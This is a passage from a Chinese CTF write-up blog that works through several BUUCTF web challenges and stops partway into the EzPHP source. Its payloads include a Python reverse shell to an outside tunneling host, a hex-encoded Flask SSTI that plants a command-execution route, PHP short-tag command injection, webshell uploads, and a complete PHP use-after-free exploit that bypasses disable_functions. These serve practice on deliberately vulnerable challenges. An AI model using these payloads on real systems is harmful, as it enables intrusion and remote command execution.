alt="image-20211124200900405"></p><p>源码没东西，只有个url的get参数，还以为是ssrf之类的，搜了下wp，这里可能是因为环境原因，有个非预期解</p><p>非预期解：</p><p>有文件读取，直接url=/flag就能下载一个beautiful.jpg,改成txt就能看见flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124201030250.png" alt="image-20211124201030250"></p><p>预期解：</p><p><strong>/proc/self/目录的意义</strong></p><p>我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124202121899.png" alt="image-20211124202121899"></p><p>读一下app.py</p><p>url=app.py</p><pre class="language-none"><code class="language-none">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp &#x3D; Flask(__name__)SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot;f &#x3D; open(SECRET_FILE)SECRET_KEY &#x3D; f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;&#x2F;page&#39;)def page():    url &#x3D; request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res &#x3D; urllib.urlopen(url)            value &#x3D; res.read()            response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39;            return response        else:            value &#x3D; &quot;HACK ERROR!&quot;    except:        value &#x3D; &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res&#x3D;value)@app.route(&#39;&#x2F;no_one_know_the_manager&#39;)def manager():    key &#x3D; request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key &#x3D;&#x3D; SECRET_KEY:        shell &#x3D; request.args.get(&quot;shell&quot;)        os.system(shell)        res &#x3D; &quot;ok&quot;    else:        res &#x3D; &quot;Wrong Key!&quot;    return resif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080)</code></pre><p>可以看到<code>no_one_know_the_manager</code>中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了</p><p>但是这个文件是用open打开的，会创建文件描述符。</p><p>我们读这个文件描述符中的内容就好了此处可以通过<code>/proc/pid/fd/</code>读取，这个目录包含了进程打开的每一个文件的链接</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203011498.png" alt="image-20211124203011498"></p><p>拿到key的内容，要url编码，但是shell执行的命令不会返回，这里使用反弹shell的方式，在根目录下读取flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203433334.png" alt="image-20211124203433334"></p><hr><p>nmd弹了几个小时终于弹tan出来了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB[BZ_FAPY[LK8VR.png" alt="img"></p><p>没公网ip，搞了个端口映射后的公网</p><p><a href="https://blog.csdn.net/weixin_41598660/article/details/105254229">(23条消息) 端口映射后的公网反弹shell_来到了学渣的博客-CSDN博客</a></p><p><a href="https://natapp.cn/register">https://natapp.cn/register</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001711038.png" alt="image-20211125001711038"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001738005.png" alt="image-20211125001738005"></p><p>把本地的8082端口映射到公网</p><p>把这个payload当shell参数的值打进去</p><pre class="language-none"><code class="language-none">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;server.natappfree.cc&#39;,xxxxx));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p>然后在Ubuntu里监听8082端口，从根目录里找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB[BZ_FAPY[LK8VR.png" alt="img"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125002051230.png" alt="image-20211125002051230"></p><p>泪目</p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200049514.png" alt="image-20211129200049514"></p><p>source</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword &#x3D; [    &#x2F;&#x2F; no path traversal    &#39;\.\.&#39;,    &#x2F;&#x2F; no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    &#x2F;&#x2F; no data exfiltration    &#39;flag&#39;  ];  $regexp &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $banword) . &#39;&#x2F;i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); #body获取post数据$json &#x3D; json_decode($body, true); #对body变量进行json解码if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123;#判断body变量是否有效，json数据要有page  $page &#x3D; $json[&#39;page&#39;];  $content &#x3D; file_get_contents($page); #从page中读出文件名，并读取文件  if (!$content || !is_valid($content)) &#123;#检查content是否有效,即不能明文传输flag文件，利用php伪协议绕过    $content &#x3D; &quot;&lt;p&gt;not found&lt;&#x2F;p&gt;\n&quot;;  &#125;&#125; else &#123;  $content &#x3D; &#39;&lt;p&gt;invalid request&lt;&#x2F;p&gt;&#39;;&#125;&#x2F;&#x2F; no data exfiltration!!!$content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\&#123;.+\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#如果查到content里有相关的ctf字样，则用censored替代echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#最后将json编码后的content输出</code></pre><p>这里可以利用json_decode会将<code>\uxxx</code>进行转义的特性，这样就可以绕过is_valid的检测</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200455993.png" alt="image-20211129200455993"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200943757.png" alt="image-20211129200943757"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>进去后是个看起来很高端的界面，但是注册然后登录后有个明显 的上传位置</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203949145.png" alt="image-20211129203949145"></p><p>通过更改头像传个马上去，蚁剑连接就行</p><p>这里前端有个判断图片类型的地方，所以先传个jpg再bp抓包改成php就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129204113745.png" alt="image-20211129204113745"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203758946.png" alt="image-20211129203758946"></p><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>ssti注入，用使用工具Arjun进行参数爆破</p><p>然后找到name参数后，拿出珍藏的写入shell的payload</p><p><a href="https://xz.aliyun.com/t/9008">ctf中flask_ssti的各种绕过技巧 - 先知社区 (aliyun.com)</a></p><pre class="language-none"><code class="language-none">&#123;% if 1&#x3D;&#x3D;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;exec&#39;](&#39;\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x0a\x0a\x40\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x2e\x72\x6f\x75\x74\x65\x28\x27\x2f\x73\x68\x65\x6c\x6c\x27\x2c\x6d\x65\x74\x68\x6f\x64\x73\x3d\x5b\x27\x47\x45\x54\x27\x2c\x27\x50\x4f\x53\x54\x27\x5d\x29\x0a\x64\x65\x66\x20\x73\x68\x65\x6c\x6c\x28\x29\x3a\x0a\x20\x20\x20\x20\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0a\x20\x20\x20\x20\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x0a\x20\x20\x20\x20\x63\x6d\x64\x3d\x72\x65\x71\x75\x65\x73\x74\x2e\x61\x72\x67\x73\x2e\x67\x65\x74\x28\x27\x63\x6d\x64\x27\x29\x0a\x20\x20\x20\x20\x72\x74\x3d\x6f\x73\x2e\x70\x6f\x70\x65\x6e\x28\x63\x6d\x64\x29\x2e\x72\x65\x61\x64\x28\x29\x0a\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x72\x74&#39;) %&#125;&#123;% endif%&#125;其中的16进制编码了原始代码</code></pre><p>即</p><pre class="language-none"><code class="language-none">from flask import current_app@current_app.route(&#39;&#x2F;shell&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def shell():    import os    from flask import request    cmd&#x3D;request.args.get(&#39;cmd&#39;)    rt&#x3D;os.popen(cmd).read()    return rt</code></pre><p>写入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213039549.png" alt="image-20211130213039549"></p><p>然后直接写入命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213128899.png" alt="image-20211130213128899"></p><p>可能会出现not found的报错，多试几次</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213228889.png" alt="image-20211130213228889"></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215102048.png" alt="image-20211202215102048"></p><p>有/secret目录，扫一下或者猜出来</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215126891.png" alt="image-20211202215126891"></p><p>arjun扫一下是否有传参</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215226926.png" alt="image-20211202215226926"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215244403.png" alt="image-20211202215244403"></p><p>当数过大时就会进入debug界面，这时候基本就确定这是ssti注入了，可以看看源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215324285.png" alt="image-20211202215324285"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215336677.png" alt="image-20211202215336677"></p><p>采用RC4加密的方式，这是一种对称加密，对密文再次加密就会变成明文，密钥是HereIsTreasure，知道这个后，利用cyberchef，对要输入的语句进行加密，再将密文传参进去</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215541398.png" alt="image-20211202215541398"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215555418.png" alt="image-20211202215555418"></p><p>能找到根目录下的flag.txt</p><p>cat读取</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215700231.png" alt="image-20211202215700231"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215712160.png" alt="image-20211202215712160"></p><p>这里应该是取巧了，buu的flag里不包含ciscn，所以这个过滤就没用了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215826313.png" alt="image-20211202215826313"></p><p><a href="https://www.sohu.com/a/370378373_750628">从一道ctf题谈谈flask开启debug模式存在的安全问题_pin (sohu.com)</a></p><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123;        &#x2F;&#x2F; if(preg_match(&quot;&#x2F;&#39;| |_|&#x3D;|php&#x2F;&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key&#x3D;&gt;$output)&#123;          $input[$key] &#x3D; waf($output);      &#125;  &#125;else&#123;      $input &#x3D; check($input);  &#125;&#125;$dir &#x3D; &#39;sandbox&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;&#x2F;&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>过滤；可以利用短标签，过滤eval可以采用反引号，过滤空格可以用\t</p><pre class="language-none"><code class="language-none">PHP中有两种短标签，&lt;??&gt;和&lt;?&#x3D;?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?&#x3D;?&gt;则是相当于&lt;? echo&gt;。</code></pre><pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\t&#x2F;&#96;?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206210913770.png" alt="image-20211206210913770"></p><pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;flllllll1112222222lag&#96;?&gt;或者?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;f*&#96;?&gt;*为通配符</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206211136986.png" alt="image-20211206211136986"></p><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>题目时thinkphp6版本的漏洞</p><p><a href="https://ld246.com/article/1579965339516">ThinkPHP6 任意文件操作漏洞分析 - 链滴 (ld246.com)</a></p><p>只需要构造 PHPSESSID 的值即可，值为 <code>string</code>&amp;&amp;长度为 32</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="tp.png"></p><p>此时查看一下生成的 session，生成的 session 文件保存在 <code>\runtime\session</code> 下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="sessionphp.png"></p><p>session 里的内容:</p><pre class="language-json" data-language="json"><code class="language-json">a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;&#125;</code></pre><p>可以看到 session 的内容经过了序列化操作，只要将 session 的内容反序列化即可 getshell</p><hr><p>这个师傅构造了一个向SESSION中写入值的类和函数，但是在本题中，搜索的内容直接被写入了SESSION（别问，问就是我也看不懂</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205225749.png" alt="image-20211208205225749"></p><p>所以我们可以修改session为.php的后缀，然后</p><p>在搜索栏里搜个马，就可以在/runtime/session路径下访问并执行这个马</p><p>先试试phpinfo</p><p>/runtime/session/sess_0123456789012345678901234568.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208203421218.png" alt="image-20211208203421218"></p><p>写个一句话木马</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205558736.png" alt="image-20211208205558736"></p><p>蚁剑连接</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205849571.png" alt="image-20211208205849571"></p><p>根目录又flag但是打开没东西，还有一个readflag是二进制文件,猜测是要执行readflag来读取flag文件里的内容</p><p>但是在虚拟终端无法执行命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210015627.png" alt="image-20211208210015627"></p><p>结合phpinfo里的禁用函数</p><p>能得出这是个突破disable_function限制执行命令的考点</p><p>之前[极客大挑战 2019]RCE ME也有这个考点（往上翻</p><p>但是在这道题里用蚁剑的插件没法绕过</p><p>上个exp（羡慕能写出这种exp的大师傅</p><pre class="language-none"><code class="language-none">&lt;?phppwn(&quot;&#x2F;readflag&quot;);function pwn($cmd)&#123;    global $abc, $helper, $backtrace;    class Vuln    &#123;        public $a;        public function __destruct()        &#123;            global $backtrace;            unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;)            if (!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper    &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8)    &#123;        $address &#x3D; 0;        for ($j &#x3D; $s - 1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p + $j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8)    &#123;        $out &#x3D; &quot;&quot;;        for ($i &#x3D; 0; $i &lt; $m; $i++) &#123;            $out .&#x3D; chr($ptr &amp; 0xff);            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8)    &#123;        $i &#x3D; 0;        for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; chr($v &amp; 0xff);            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8)    &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if ($s !&#x3D; 8) &#123;            $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1;        &#125;        return $leak;    &#125;    function parse_elf($base)    &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for ($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec                $text_size &#x3D; $p_memsz;            &#125;        &#125;        if (!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf)    &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for ($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;constant&#39; constant check                if ($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;bin2hex&#39; constant check                if ($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak)    &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for ($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if ($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs)    &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if ($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while ($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg)    &#123;        # str_shuffle prevents opcache string interning        $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if (stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10; # increase this value if UAF fails    $contiguous &#x3D; [];    for ($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123;    &#125;;    if (strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    # leaks    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if (!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if (!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if (!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if (!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    # fake closure object    $fake_obj_offset &#x3D; 0xd0;    for ($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();&#125;</code></pre><p>把这个php文件找个地方传上去</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210715741.png" alt="image-20211208210715741"></p><p>访问这个路径，得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210736589.png" alt="image-20211208210736589"></p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>这个题是个挺有意思的代码审计题</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211705547.png" alt="image-20211208211705547"></p><p>中间这个东西链接好像寄了，但是不影响做题，源码里有串base32，解码为1nD3x.php</p><p>访问这个页面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211820293.png" alt="image-20211208211820293"></p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;;$shana &#x3D; $_GET[&#39;shana&#39;];$passwd &#x3D; $_GET[&#39;passwd&#39;];$arg &#x3D; &#39;&#39;;$code &#x3D; &#39;&#39;;echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;if($_SERVER) &#123;     if (  preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123;         $file &#x3D; $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125; if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! 